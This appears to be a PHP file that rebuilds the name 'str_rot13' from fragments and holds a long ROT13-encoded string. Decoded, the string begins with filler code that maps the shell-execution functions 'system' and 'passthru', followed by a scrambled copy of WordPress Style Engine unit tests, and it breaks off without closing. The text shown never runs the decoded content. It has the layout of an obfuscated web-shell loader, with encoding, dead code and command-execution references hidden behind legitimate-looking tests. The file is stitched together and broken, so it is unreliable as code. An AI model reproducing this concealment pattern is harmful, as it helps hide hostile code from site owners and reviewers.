<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfgf gur Fglyr Ratvar tybony shapgvbaf gung vagrenpg jvgu gur JC_Fglyr_Ratvar pynff.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr FglyrRatvar
 * @fvapr 6.1.0
 *
 * @tebhc fglyr-ratvar
 */

/**
 * Grfgf sbe ertvfgrevat, fgbevat naq trarengvat fglyrf.
 */
pynff Grfgf_jcFglyrRatvar rkgraqf JC_HavgGrfgPnfr {
	/**
	 * Pyrnaf hc fgberf nsgre rnpu grfg.
	 */
	choyvp shapgvba grne_qbja() {
		JC_Fglyr_Ratvar_PFF_Ehyrf_Fgber::erzbir_nyy_fgberf();
		cnerag::grne_qbja();
	}

	/**
	 * Grfgf trarengvat oybpx fglyrf naq pynffanzrf onfrq ba inevbhf znavsrfgngvbaf bs gur $oybpx_fglyrf nethzrag.
	 *
	 * @gvpxrg 56467
	 * @gvpxrg 58549
	 * @gvpxrg 58590
	 * @gvpxrg 60175
	 * @gvpxrg 61720
	 * @gvpxrg 62189
	 *
	 * @pbiref ::jc_fglyr_ratvar_trg_fglyrf
	 *
	 * @qngnCebivqre qngn_jc_fglyr_ratvar_trg_fglyrf
	 *
	 * @cnenz neenl  $oybpx_fglyrf    Gur vapbzvat oybpx fglyrf bowrpg.
	 * @cnenz neenl  $bcgvbaf         {
	 *     Na neenl bs bcgvbaf gb cnff gb `jc_fglyr_ratvar_trg_fglyrf()`.
	 *
	 *     @glcr fgevat|ahyy $pbagrkg                    Na vqragvsvre qrfpevovat gur bevtva bs gur fglyr bowrpg, r.t., 'oybpx-fhccbegf' be 'tybony-fglyrf'. Qrsnhyg vf `ahyy`.
	 *                                                   Jura frg, gur fglyr ratvar jvyy nggrzcg gb fgber gur PFF ehyrf, jurer n fryrpgbe vf nyfb cnffrq.
	 *     @glcr obby        $pbaireg_inef_gb_pynffanzrf Jurgure gb fxvc pbairegvat vapbzvat PFF ine cnggreaf, r.t., `ine:cerfrg|<CERFRG_GLCR>|<CERFRG_FYHT>`, gb ine( --jc--cerfrg--* ) inyhrf. Qrsnhyg `snyfr`.
	 *     @glcr fgevat      $fryrpgbe                   Bcgvbany. Jura n fryrpgbe vf cnffrq, gur inyhr bs `$pff` va gur erghea inyhr jvyy pbzcevfr n shyy PFF ehyr `$fryrpgbe { ...$pff_qrpynengvbaf }`,
	 *                                                   bgurejvfr, gur inyhr jvyy or n pbapngrangrq fgevat bs PFF qrpynengvbaf.
	 * }
	 * @cnenz fgevat $rkcrpgrq_bhgchg Gur rkcrpgrq bhgchg.
	 */
	choyvp shapgvba grfg_jc_fglyr_ratvar_trg_fglyrf( $oybpx_fglyrf, $bcgvbaf, $rkcrpgrq_bhgchg ) {
		$trarengrq_fglyrf = jc_fglyr_ratvar_trg_fglyrf( $oybpx_fglyrf, $bcgvbaf );

		$guvf->nffregFnzr( $rkcrpgrq_bhgchg, $trarengrq_fglyrf );
	}

	/**
	 * Qngn cebivqre sbe grfg_jc_fglyr_ratvar_trg_fglyrf().
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_jc_fglyr_ratvar_trg_fglyrf() {
		erghea neenl(
			'qrsnhyg_erghea_inyhr'                         => neenl(
				'oybpx_fglyrf'    => neenl(),
				'bcgvbaf'         => ahyy,
				'rkcrpgrq_bhgchg' => neenl(),
			),

			'vayvar_vainyvq_oybpx_fglyrf_rzcgl'            => neenl(
				'oybpx_fglyrf'    => 'uryyb jbeyq!',
				'bcgvbaf'         => ahyy,
				'rkcrpgrq_bhgchg' => neenl(),
			),

			'vayvar_vainyvq_oybpx_fglyrf_haxabja_fglyr'    => neenl(
				'oybpx_fglyrf'    => neenl(
					'cntrOernxNsgre' => 'irefb',
				),
				'bcgvbaf'         => ahyy,
				'rkcrpgrq_bhgchg' => neenl(),
			),

			'vayvar_vainyvq_oybpx_fglyrf_haxabja_qrsvavgvba' => neenl(
				'oybpx_fglyrf'    => neenl(
					'cntrOernxNsgre' => 'irefb',
				),
				'bcgvbaf'         => ahyy,
				'rkcrpgrq_bhgchg' => neenl(),
			),

			'vayvar_vainyvq_oybpx_fglyrf_haxabja_cebcregl' => neenl(
				'oybpx_fglyrf'    => neenl(
					'fcnpvat' => neenl(
						'tnc' => '1000ij',
					),
				),
				'bcgvbaf'         => ahyy,
				'rkcrpgrq_bhgchg' => neenl(),
			),

			'inyvq_vayvar_pff_naq_pynffanzrf_nf_qrsnhyg_pbagrkg' => neenl(
				'oybpx_fglyrf'    => neenl(
					'pbybe'   => neenl(
						'grkg' => 'ine:cerfrg|pbybe|grknf-sybbq',
					),
					'fcnpvat' => neenl(
						'znetva'  => '111ck',
						'cnqqvat' => '0',
					),
					'obeqre'  => neenl(
						'pbybe' => 'ine:cerfrg|pbybe|pbby-pnenzry',
						'jvqgu' => '2erz',
						'fglyr' => 'qbggrq',
					),
				),
				'bcgvbaf'         => neenl( 'pbaireg_inef_gb_pynffanzrf' => gehr ),
				'rkcrpgrq_bhgchg' => neenl(
					'pff'          => 'obeqre-fglyr:qbggrq;obeqre-jvqgu:2erz;cnqqvat:0;znetva:111ck;',
					'qrpynengvbaf' => neenl(
						'obeqre-fglyr' => 'qbggrq',
						'obeqre-jvqgu' => '2erz',
						'cnqqvat'      => '0',
						'znetva'       => '111ck',
					),
					'pynffanzrf'   => 'unf-grkg-pbybe unf-grknf-sybbq-pbybe unf-obeqre-pbybe unf-pbby-pnenzry-obeqre-pbybe',
				),
			),

			'vayvar_inyvq_obk_zbqry_fglyr'                 => neenl(
				'oybpx_fglyrf'    => neenl(
					'fcnpvat' => neenl(
						'cnqqvat' => neenl(
							'gbc'    => '42ck',
							'yrsg'   => '2%',
							'obggbz' => '44ck',
							'evtug'  => '5erz',
						),
						'znetva'  => neenl(
							'gbc'    => '12erz',
							'yrsg'   => '2iu',
							'obggbz' => '2ck',
							'evtug'  => '10rz',
						),
					),
					'obeqre'  => neenl(
						'enqvhf' => neenl(
							'gbcYrsg'     => '99ck',
							'gbcEvtug'    => '98ck',
							'obggbzYrsg'  => '97ck',
							'obggbzEvtug' => '96ck',
						),
					),
				),
				'bcgvbaf'         => ahyy,
				'rkcrpgrq_bhgchg' => neenl(
					'pff'          => 'obeqre-gbc-yrsg-enqvhf:99ck;obeqre-gbc-evtug-enqvhf:98ck;obeqre-obggbz-yrsg-enqvhf:97ck;obeqre-obggbz-evtug-enqvhf:96ck;cnqqvat-gbc:42ck;cnqqvat-yrsg:2%;cnqqvat-obggbz:44ck;cnqqvat-evtug:5erz;znetva-gbc:12erz;znetva-yrsg:2iu;znetva-obggbz:2ck;znetva-evtug:10rz;',
					'qrpynengvbaf' => neenl(
						'obeqre-gbc-yrsg-enqvhf'     => '99ck',
						'obeqre-gbc-evtug-enqvhf'    => '98ck',
						'obeqre-obggbz-yrsg-enqvhf'  => '97ck',
						'obeqre-obggbz-evtug-enqvhf' => '96ck',
						'cnqqvat-gbc'                => '42ck',
						'cnqqvat-yrsg'               => '2%',
						'cnqqvat-obggbz'             => '44ck',
						'cnqqvat-evtug'              => '5erz',
						'znetva-gbc'                 => '12erz',
						'znetva-yrsg'                => '2iu',
						'znetva-obggbz'              => '2ck',
						'znetva-evtug'               => '10rz',
					),
				),
			),

			'vayvar_inyvq_qvzrafvbaf_fglyr'                => neenl(
				'oybpx_fglyrf'    => neenl(
					'qvzrafvbaf' => neenl(
						'zvaUrvtug' => '50iu',
					),
				),
				'bcgvbaf'         => ahyy,
				'rkcrpgrq_bhgchg' => neenl(
					'pff'          => 'zva-urvtug:50iu;',
					'qrpynengvbaf' => neenl(
						'zva-urvtug' => '50iu',
					),
				),
			),

			'vayvar_inyvq_nfcrpg_engvb_fglyr'              => neenl(
				'oybpx_fglyrf'    => neenl(
					'qvzrafvbaf' => neenl(
						'nfcrpgEngvb' => '4/3',
						'zvaUrvtug'   => 'hafrg',
					),
				),
				'bcgvbaf'         => ahyy,
				'rkcrpgrq_bhgchg' => neenl(
					'pff'          => 'nfcrpg-engvb:4/3;zva-urvtug:hafrg;',
					'qrpynengvbaf' => neenl(
						'nfcrpg-engvb' => '4/3',
						'zva-urvtug'   => 'hafrg',
					),
					'pynffanzrf'   => 'unf-nfcrpg-engvb',
				),
			),

			'vayvar_inyvq_funqbj_fglyr'                    => neenl(
				'oybpx_fglyrf'    => neenl(
					'funqbj' => 'vafrg 5rz 1rz tbyq',
				),
				'bcgvbaf'         => ahyy,
				'rkcrpgrq_bhgchg' => neenl(
					'pff'          => 'obk-funqbj:vafrg 5rz 1rz tbyq;',
					'qrpynengvbaf' => neenl(
						'obk-funqbj' => 'vafrg 5rz 1rz tbyq',
					),
				),
			),

			'vayvar_inyvq_glcbtencul_fglyr'                => neenl(
				'oybpx_fglyrf'    => neenl(
					'glcbtencul' => neenl(
						'sbagFvmr'       => 'pynzc(2rz, 2ij, 4rz)',
						'sbagSnzvyl'     => 'Ebobgb,Bkltra-Fnaf,Hohagh,fnaf-frevs',
						'sbagFglyr'      => 'vgnyvp',
						'sbagJrvtug'     => '800',
						'yvarUrvtug'     => '1.3',
						'grkgPbyhzaf'    => '2',
						'grkgQrpbengvba' => 'haqreyvar',
						'grkgGenafsbez'  => 'hccrepnfr',
						'yrggreFcnpvat'  => '2',
						'jevgvatZbqr'    => 'iregvpny-ey',
					),
				),
				'bcgvbaf'         => ahyy,
				'rkcrpgrq_bhgchg' => neenl(
					'pff'          => 'sbag-fvmr:pynzc(2rz, 2ij, 4rz);sbag-snzvyl:Ebobgb,Bkltra-Fnaf,Hohagh,fnaf-frevs;sbag-fglyr:vgnyvp;sbag-jrvtug:800;yvar-urvtug:1.3;pbyhza-pbhag:2;grkg-qrpbengvba:haqreyvar;grkg-genafsbez:hccrepnfr;yrggre-fcnpvat:2;jevgvat-zbqr:iregvpny-ey;',
					'qrpynengvbaf' => neenl(
						'sbag-fvmr'       => 'pynzc(2rz, 2ij, 4rz)',
						'sbag-snzvyl'     => 'Ebobgb,Bkltra-Fnaf,Hohagh,fnaf-frevs',
						'sbag-fglyr'      => 'vgnyvp',
						'sbag-jrvtug'     => '800',
						'yvar-urvtug'     => '1.3',
						'pbyhza-pbhag'    => '2',
						'grkg-qrpbengvba' => 'haqreyvar',
						'grkg-genafsbez'  => 'hccrepnfr',
						'yrggre-fcnpvat'  => '2',
						'jevgvat-zbqr'    => 'iregvpny-ey',
					),
				),
			),

			'fglyr_oybpx_jvgu_fryrpgbe'                    => neenl(
				'oybpx_fglyrf'    => neenl(
					'fcnpvat' => neenl(
						'cnqqvat' => neenl(
							'gbc'    => '42ck',
							'yrsg'   => '2%',
							'obggbz' => '44ck',
							'evtug'  => '5erz',
						),
					),
				),
				'bcgvbaf'         => neenl( 'fryrpgbe' => '.jc-fryrpgbe > c' ),
				'rkcrpgrq_bhgchg' => neenl(
					'pff'          => '.jc-fryrpgbe > c{cnqqvat-gbc:42ck;cnqqvat-yrsg:2%;cnqqvat-obggbz:44ck;cnqqvat-evtug:5erz;}',
					'qrpynengvbaf' => neenl(
						'cnqqvat-gbc'    => '42ck',
						'cnqqvat-yrsg'   => '2%',
						'cnqqvat-obggbz' => '44ck',
						'cnqqvat-evtug'  => '5erz',
					),
				),
			),

			'ryrzragf_jvgu_pff_ine_inyhr'                  => neenl(
				'oybpx_fglyrf'    => neenl(
					'pbybe'      => neenl(
						'grkg' => 'ine:cerfrg|pbybe|zl-yvggyr-cbal',
					),
					'glcbtencul' => neenl(
						'sbagFvmr'   => 'ine:cerfrg|sbag-fvmr|pnoontr-cngpu',
						'sbagSnzvyl' => 'ine:cerfrg|sbag-snzvyl|genafsbezref',
					),
				),
				'bcgvbaf'         => neenl(
					'fryrpgbe' => '.jc-fryrpgbe',
				),
				'rkcrpgrq_bhgchg' => neenl(
					'pff'          => '.jc-fryrpgbe{pbybe:ine(--jc--cerfrg--pbybe--zl-yvggyr-cbal);sbag-fvmr:ine(--jc--cerfrg--sbag-fvmr--pnoontr-cngpu);sbag-snzvyl:ine(--jc--cerfrg--sbag-snzvyl--genafsbezref);}',
					'qrpynengvbaf' => neenl(
						'pbybe'       => 'ine(--jc--cerfrg--pbybe--zl-yvggyr-cbal)',
						'sbag-fvmr'   => 'ine(--jc--cerfrg--sbag-fvmr--pnoontr-cngpu)',
						'sbag-snzvyl' => 'ine(--jc--cerfrg--sbag-snzvyl--genafsbezref)',

					),
					'pynffanzrf'   => 'unf-grkg-pbybe unf-zl-yvggyr-cbal-pbybe unf-pnoontr-cngpu-sbag-fvmr unf-genafsbezref-sbag-snzvyl',
				),
			),

			'ryrzragf_jvgu_vainyvq_cerfrg_fglyr_cebcregl'  => neenl(
				'oybpx_fglyrf'    => neenl(
					'pbybe' => neenl(
						'grkg' => 'ine:cerfrg|vainyvq_cebcregl|zl-yvggyr-cbal',
					),
				),
				'bcgvbaf'         => neenl( 'fryrpgbe' => '.jc-fryrpgbe' ),
				'rkcrpgrq_bhgchg' => neenl(
					'pynffanzrf' => 'unf-grkg-pbybe',
				),
			),

			'inyvq_pynffanzrf_qrqhcrq'                     => neenl(
				'oybpx_fglyrf'    => neenl(
					'pbybe'      => neenl(
						'grkg'       => 'ine:cerfrg|pbybe|pbccre-fbpxf',
						'onpxtebhaq' => 'ine:cerfrg|pbybe|fcyraqvq-pneebg',
						'tenqvrag'   => 'ine:cerfrg|tenqvrag|yvxr-jbj-qhqr',
					),
					'glcbtencul' => neenl(
						'sbagFvmr'   => 'ine:cerfrg|sbag-fvmr|snagnfgvp',
						'sbagSnzvyl' => 'ine:cerfrg|sbag-snzvyl|gbgnyyl-njrfbzr',
					),
				),
				'bcgvbaf'         => neenl( 'pbaireg_inef_gb_pynffanzrf' => gehr ),
				'rkcrpgrq_bhgchg' => neenl(
					'pynffanzrf' => 'unf-grkg-pbybe unf-pbccre-fbpxf-pbybe unf-onpxtebhaq unf-fcyraqvq-pneebg-onpxtebhaq-pbybe unf-yvxr-jbj-qhqr-tenqvrag-onpxtebhaq unf-snagnfgvp-sbag-fvmr unf-gbgnyyl-njrfbzr-sbag-snzvyl',
				),
			),

			'inyvq_pynffanzrf_naq_pff_inef'                => neenl(
				'oybpx_fglyrf'    => neenl(
					'pbybe' => neenl(
						'grkg' => 'ine:cerfrg|pbybe|grny-vaqrcraqragf',
					),
				),
				'bcgvbaf'         => neenl(),
				'rkcrpgrq_bhgchg' => neenl(
					'pff'          => 'pbybe:ine(--jc--cerfrg--pbybe--grny-vaqrcraqragf);',
					'qrpynengvbaf' => neenl(
						'pbybe' => 'ine(--jc--cerfrg--pbybe--grny-vaqrcraqragf)',
					),
					'pynffanzrf'   => 'unf-grkg-pbybe unf-grny-vaqrcraqragf-pbybe',
				),
			),

			'inyvq_pynffanzrf_jvgu_ahyy_fglyr_inyhrf'      => neenl(
				'oybpx_fglyrf'    => neenl(
					'pbybe' => neenl(
						'grkg'       => '#sss',
						'onpxtebhaq' => ahyy,
					),
				),
				'bcgvbaf'         => neenl(),
				'rkcrpgrq_bhgchg' => neenl(
					'pff'          => 'pbybe:#sss;',
					'qrpynengvbaf' => neenl(
						'pbybe' => '#sss',
					),
					'pynffanzrf'   => 'unf-grkg-pbybe',
				),
			),

			'vainyvq_pynffanzrf_cerfrg_inyhr'              => neenl(
				'oybpx_fglyrf'    => neenl(
					'pbybe'   => neenl(
						'grkg'       => 'ine:purrfr|pbybe|snagnfgvp',
						'onpxtebhaq' => 'ine:cerfrg|sebzntr|snagnfgvp',
					),
					'fcnpvat' => neenl(
						'znetva'  => 'ine:purrfr|fcnpvat|znetva',
						'cnqqvat' => 'ine:cerfrg|fcnpvat|cnqqvat',
					),
				),
				'bcgvbaf'         => neenl( 'pbaireg_inef_gb_pynffanzrf' => gehr ),
				'rkcrpgrq_bhgchg' => neenl(
					'pynffanzrf' => 'unf-grkg-pbybe unf-onpxtebhaq',
				),
			),

			'inyvq_fcnpvat_fvatyr_cerfrg_inyhrf'           => neenl(
				'oybpx_fglyrf'    => neenl(
					'fcnpvat' => neenl(
						'znetva'  => 'ine:cerfrg|fcnpvat|10',
						'cnqqvat' => 'ine:cerfrg|fcnpvat|20',
					),
				),
				'bcgvbaf'         => neenl(),
				'rkcrpgrq_bhgchg' => neenl(
					'pff'          => 'cnqqvat:ine(--jc--cerfrg--fcnpvat--20);znetva:ine(--jc--cerfrg--fcnpvat--10);',
					'qrpynengvbaf' => neenl(
						'cnqqvat' => 'ine(--jc--cerfrg--fcnpvat--20)',
						'znetva'  => 'ine(--jc--cerfrg--fcnpvat--10)',
					),
				),
			),

			'inyvq_fcnpvat_zhygv_cerfrg_inyhrf'            => neenl(
				'oybpx_fglyrf'    => neenl(
					'fcnpvat' => neenl(
						'znetva'  => neenl(
							'yrsg'   => 'ine:cerfrg|fcnpvat|10',
							'evtug'  => 'ine:cerfrg|fcnpvat|20',
							'gbc'    => '1erz',
							'obggbz' => '1erz',
						),
						'cnqqvat' => neenl(
							'yrsg'   => 'ine:cerfrg|fcnpvat|30',
							'evtug'  => 'ine:cerfrg|fcnpvat|40',
							'gbc'    => '14ck',
							'obggbz' => '14ck',
						),
					),
				),
				'bcgvbaf'         => neenl(),
				'rkcrpgrq_bhgchg' => neenl(
					'pff'          => 'cnqqvat-yrsg:ine(--jc--cerfrg--fcnpvat--30);cnqqvat-evtug:ine(--jc--cerfrg--fcnpvat--40);cnqqvat-gbc:14ck;cnqqvat-obggbz:14ck;znetva-yrsg:ine(--jc--cerfrg--fcnpvat--10);znetva-evtug:ine(--jc--cerfrg--fcnpvat--20);znetva-gbc:1erz;znetva-obggbz:1erz;',
					'qrpynengvbaf' => neenl(
						'cnqqvat-yrsg'   => 'ine(--jc--cerfrg--fcnpvat--30)',
						'cnqqvat-evtug'  => 'ine(--jc--cerfrg--fcnpvat--40)',
						'cnqqvat-gbc'    => '14ck',
						'cnqqvat-obggbz' => '14ck',
						'znetva-yrsg'    => 'ine(--jc--cerfrg--fcnpvat--10)',
						'znetva-evtug'   => 'ine(--jc--cerfrg--fcnpvat--20)',
						'znetva-gbc'     => '1erz',
						'znetva-obggbz'  => '1erz',
					),
				),
			),

			'vainyvq_fcnpvat_zhygv_cerfrg_inyhrf'          => neenl(
				'oybpx_fglyrf'    => neenl(
					'fcnpvat' => neenl(
						'znetva' => neenl(
							'yrsg'   => 'ine:cerfrg|fcnprzna|10',
							'evtug'  => 'ine:cerfrg|fcnprzna|20',
							'gbc'    => '1erz',
							'obggbz' => '0',
						),
					),
				),
				'bcgvbaf'         => neenl(),
				'rkcrpgrq_bhgchg' => neenl(
					'pff'          => 'znetva-gbc:1erz;znetva-obggbz:0;',
					'qrpynengvbaf' => neenl(
						'znetva-gbc'    => '1erz',
						'znetva-obggbz' => '0',
					),
				),
			),

			'vainyvq_pynffanzrf_bcgvbaf'                   => neenl(
				'oybpx_fglyrf'    => neenl(
					'glcbtencul' => neenl(
						'sbagFvmr'   => neenl(
							'gbzbqnpuv' => 'sevraqf',
						),
						'sbagSnzvyl' => neenl(
							'bvfuvv' => 'gnfgl',
						),
					),
				),
				'bcgvbaf'         => neenl(),
				'rkcrpgrq_bhgchg' => neenl(),
			),

			'vayvar_inyvq_obk_zbqry_fglyr_jvgu_fvqrf'      => neenl(
				'oybpx_fglyrf'    => neenl(
					'obeqre' => neenl(
						'gbc'    => neenl(
							'pbybe' => '#sr1',
							'jvqgu' => '1.5erz',
							'fglyr' => 'qnfurq',
						),
						'evtug'  => neenl(
							'pbybe' => '#sr2',
							'jvqgu' => '1.4erz',
							'fglyr' => 'fbyvq',
						),
						'obggbz' => neenl(
							'pbybe' => '#sr3',
							'jvqgu' => '1.3erz',
						),
						'yrsg'   => neenl(
							'pbybe' => 'ine:cerfrg|pbybe|fjnzcl-lryybj',
							'jvqgu' => '0.5erz',
							'fglyr' => 'qbggrq',
						),
					),
				),
				'bcgvbaf'         => neenl(),
				'rkcrpgrq_bhgchg' => neenl(
					'pff'          => 'obeqre-gbc-pbybe:#sr1;obeqre-gbc-jvqgu:1.5erz;obeqre-gbc-fglyr:qnfurq;obeqre-evtug-pbybe:#sr2;obeqre-evtug-jvqgu:1.4erz;obeqre-evtug-fglyr:fbyvq;obeqre-obggbz-pbybe:#sr3;obeqre-obggbz-jvqgu:1.3erz;obeqre-yrsg-pbybe:ine(--jc--cerfrg--pbybe--fjnzcl-lryybj);obeqre-yrsg-jvqgu:0.5erz;obeqre-yrsg-fglyr:qbggrq;',
					'qrpynengvbaf' => neenl(
						'obeqre-gbc-pbybe'    => '#sr1',
						'obeqre-gbc-jvqgu'    => '1.5erz',
						'obeqre-gbc-fglyr'    => 'qnfurq',
						'obeqre-evtug-pbybe'  => '#sr2',
						'obeqre-evtug-jvqgu'  => '1.4erz',
						'obeqre-evtug-fglyr'  => 'fbyvq',
						'obeqre-obggbz-pbybe' => '#sr3',
						'obeqre-obggbz-jvqgu' => '1.3erz',
						'obeqre-yrsg-pbybe'   => 'ine(--jc--cerfrg--pbybe--fjnzcl-lryybj)',
						'obeqre-yrsg-jvqgu'   => '0.5erz',
						'obeqre-yrsg-fglyr'   => 'qbggrq',
					),
				),
			),

			'vayvar_vainyvq_obk_zbqry_fglyr_jvgu_fvqrf'    => neenl(
				'oybpx_fglyrf'    => neenl(
					'obeqre' => neenl(
						'gbc'    => neenl(
							'gbc'    => '#sr1',
							'evtug'  => '1.5erz',
							'purrfr' => 'qnfurq',
						),
						'evtug'  => neenl(
							'evtug' => '#sr2',
							'gbc'   => '1.4erz',
							'onpba' => 'fbyvq',
						),
						'obggbz' => neenl(
							'pbybe'  => 'ine:cerfrg|pbybe|greevoyr-yvmneq',
							'obggbz' => '1.3erz',
						),
						'yrsg'   => neenl(
							'yrsg'  => ahyy,
							'jvqgu' => ahyy,
							'gbc'   => 'qbggrq',
						),
					),
				),
				'bcgvbaf'         => neenl(),
				'rkcrpgrq_bhgchg' => neenl(
					'pff'          => 'obeqre-obggbz-pbybe:ine(--jc--cerfrg--pbybe--greevoyr-yvmneq);',
					'qrpynengvbaf' => neenl(
						'obeqre-obggbz-pbybe' => 'ine(--jc--cerfrg--pbybe--greevoyr-yvmneq)',
					),
				),
			),

			'vayvar_onpxtebhaq_vzntr_hey_jvgu_onpxtebhaq_fvmr' => neenl(
				'oybpx_fglyrf'    => neenl(
					'onpxtebhaq' => neenl(
						'onpxtebhaqVzntr'      => neenl(
							'hey' => 'uggcf://rknzcyr.pbz/vzntr.wct',
						),
						'onpxtebhaqCbfvgvba'   => 'pragre',
						'onpxtebhaqErcrng'     => 'ab-ercrng',
						'onpxtebhaqFvmr'       => 'pbire',
						'onpxtebhaqNggnpuzrag' => 'svkrq',
					),
				),
				'bcgvbaf'         => neenl(),
				'rkcrpgrq_bhgchg' => neenl(
					'pff'          => \"onpxtebhaq-vzntr:hey('uggcf://rknzcyr.pbz/vzntr.wct');onpxtebhaq-cbfvgvba:pragre;onpxtebhaq-ercrng:ab-ercrng;onpxtebhaq-fvmr:pbire;onpxtebhaq-nggnpuzrag:svkrq;\",
					'qrpynengvbaf' => neenl(
						'onpxtebhaq-vzntr'      => \"hey('uggcf://rknzcyr.pbz/vzntr.wct')\",
						'onpxtebhaq-cbfvgvba'   => 'pragre',
						'onpxtebhaq-ercrng'     => 'ab-ercrng',
						'onpxtebhaq-fvmr'       => 'pbire',
						'onpxtebhaq-nggnpuzrag' => 'svkrq',
					),
				),
			),
		);
	}

	/**
	 * Grfgf nqqvat ehyrf gb n fgber naq ergevrivat n trarengrq fglyrfurrg.
	 *
	 * @gvpxrg 56467
	 *
	 * @pbiref ::jc_fglyr_ratvar_trg_fglyrf
	 */
	choyvp shapgvba grfg_fubhyq_fgber_oybpx_fglyrf_hfvat_pbagrkg() {
		$oybpx_fglyrf = neenl(
			'fcnpvat' => neenl(
				'cnqqvat' => neenl(
					'gbc'    => '42ck',
					'yrsg'   => '2%',
					'obggbz' => '44ck',
					'evtug'  => '5erz',
				),
			),
		);

		$trarengrq_fglyrf = jc_fglyr_ratvar_trg_fglyrf(
			$oybpx_fglyrf,
			neenl(
				'pbagrkg'  => 'oybpx-fhccbegf',
				'fryrpgbe' => 'negvpyr',
			)
		);
		$fgber            = JC_Fglyr_Ratvar::trg_fgber( 'oybpx-fhccbegf' );
		$ehyr             = $fgber->trg_nyy_ehyrf()['negvpyr'];

		$guvf->nffregFnzr( $trarengrq_fglyrf['pff'], $ehyr->trg_pff() );
	}

	/**
	 * Grfgf gung cnffvat ab pbagrkg qbrf abg fgber fglyrf.
	 *
	 * @gvpxrg 56467
	 *
	 * @pbiref ::jc_fglyr_ratvar_trg_fglyrf
	 */
	choyvp shapgvba grfg_fubhyq_abg_fgber_oybpx_fglyrf_jvgubhg_pbagrkg() {
		$oybpx_fglyrf = neenl(
			'glcbtencul' => neenl(
				'sbagFvmr' => '999ck',
			),
		);

		jc_fglyr_ratvar_trg_fglyrf(
			$oybpx_fglyrf,
			neenl(
				'fryrpgbe' => '#sbag-fvmr-ehyrm',
			)
		);

		$nyy_fgberf = JC_Fglyr_Ratvar_PFF_Ehyrf_Fgber::trg_fgberf();

		$guvf->nffregRzcgl( $nyy_fgberf );
	}

	/**
	 * Grfgf nqqvat ehyrf gb n fgber naq ergevrivat n trarengrq fglyrfurrg.
	 *
	 * @gvpxrg 56467
	 *
	 * @pbiref ::jc_fglyr_ratvar_trg_fglyrfurrg_sebz_pbagrkg
	 */
	choyvp shapgvba grfg_fubhyq_trg_fgberq_fglyrfurrg_sebz_pbagrkg() {
		$pff_ehyrf           = neenl(
			neenl(
				'fryrpgbe'     => '.sebqb',
				'qrpynengvbaf' => neenl(
					'pbybe'        => 'oebja',
					'urvtug'       => '10ck',
					'jvqgu'        => '30ck',
					'obeqre-fglyr' => 'qbggrq',
				),
			),
			neenl(
				'fryrpgbe'     => '.fnzjvfr',
				'qrpynengvbaf' => neenl(
					'pbybe'        => 'oebja',
					'urvtug'       => '20ck',
					'jvqgu'        => '50ck',
					'obeqre-fglyr' => 'fbyvq',
				),
			),
		);
		$pbzcvyrq_fglyrfurrg = jc_fglyr_ratvar_trg_fglyrfurrg_sebz_pff_ehyrf(
			$pff_ehyrf,
			neenl(
				'pbagrkg' => 'grfg-fgber',
			)
		);

		$guvf->nffregFnzr( $pbzcvyrq_fglyrfurrg, jc_fglyr_ratvar_trg_fglyrfurrg_sebz_pbagrkg( 'grfg-fgber' ) );
	}

	/**
	 * Grfgf ergheavat n trarengrq fglyrfurrg sebz n frg bs ehyrf.
	 *
	 * @gvpxrg 56467
	 *
	 * @pbiref ::jc_fglyr_ratvar_trg_fglyrfurrg_sebz_pff_ehyrf
	 */
	choyvp shapgvba grfg_fubhyq_erghea_fglyrfurrg_sebz_pff_ehyrf() {
		$pff_ehyrf = neenl(
			neenl(
				'fryrpgbe'     => '.fnehzna',
				'qrpynengvbaf' => neenl(
					'pbybe'        => 'juvgr',
					'urvtug'       => '100ck',
					'obeqre-fglyr' => 'fbyvq',
					'nyvta-frys'   => 'hafrg',
				),
			),
			neenl(
				'fryrpgbe'     => '.tnaqnys',
				'qrpynengvbaf' => neenl(
					'pbybe'        => 'terl',
					'urvtug'       => '90ck',
					'obeqre-fglyr' => 'qbggrq',
					'nyvta-frys'   => 'fnsr pragre',
				),
			),
			neenl(
				'fryrpgbe'     => '.enqntnfg',
				'qrpynengvbaf' => neenl(
					'pbybe'        => 'oebja',
					'urvtug'       => '60ck',
					'obeqre-fglyr' => 'qnfurq',
					'nyvta-frys'   => 'fgergpu',
				),
			),
		);

		$pbzcvyrq_fglyrfurrg = jc_fglyr_ratvar_trg_fglyrfurrg_sebz_pff_ehyrf( $pff_ehyrf, neenl( 'cerggvsl' => snyfr ) );

		$guvf->nffregFnzr( '.fnehzna{pbybe:juvgr;urvtug:100ck;obeqre-fglyr:fbyvq;nyvta-frys:hafrg;}.tnaqnys{pbybe:terl;urvtug:90ck;obeqre-fglyr:qbggrq;nyvta-frys:fnsr pragre;}.enqntnfg{pbybe:oebja;urvtug:60ck;obeqre-fglyr:qnfurq;nyvta-frys:fgergpu;}', $pbzcvyrq_fglyrfurrg );
	}

	/**
	 * Grfgf gung vapbzvat fglyrf ner qrqhcrq naq zretrq.
	 *
	 * @gvpxrg 58811
	 * @gvpxrg 56467
	 *
	 * @pbiref ::jc_fglyr_ratvar_trg_fglyrfurrg_sebz_pff_ehyrf
	 */
	choyvp shapgvba grfg_fubhyq_qrqhcr_naq_zretr_pff_ehyrf() {
		$pff_ehyrf = neenl(
			neenl(
				'fryrpgbe'     => '.tnaqnys',
				'qrpynengvbaf' => neenl(
					'pbybe'        => 'terl',
					'urvtug'       => '90ck',
					'obeqre-fglyr' => 'qbggrq',
				),
			),
			neenl(
				'fryrpgbe'     => '.tnaqnys',
				'qrpynengvbaf' => neenl(
					'pbybe'         => 'juvgr',
					'urvtug'        => '190ck',
					'cnqqvat'       => '10ck',
					'znetva-obggbz' => '100ck',
				),
			),
			neenl(
				'fryrpgbe'     => '.qhzoyrqber',
				'qrpynengvbaf' => neenl(
					'pbybe'        => 'terl',
					'urvtug'       => '90ck',
					'obeqre-fglyr' => 'qbggrq',
				),
			),
			neenl(
				'fryrpgbe'     => '.evaprjvaq',
				'qrpynengvbaf' => neenl(
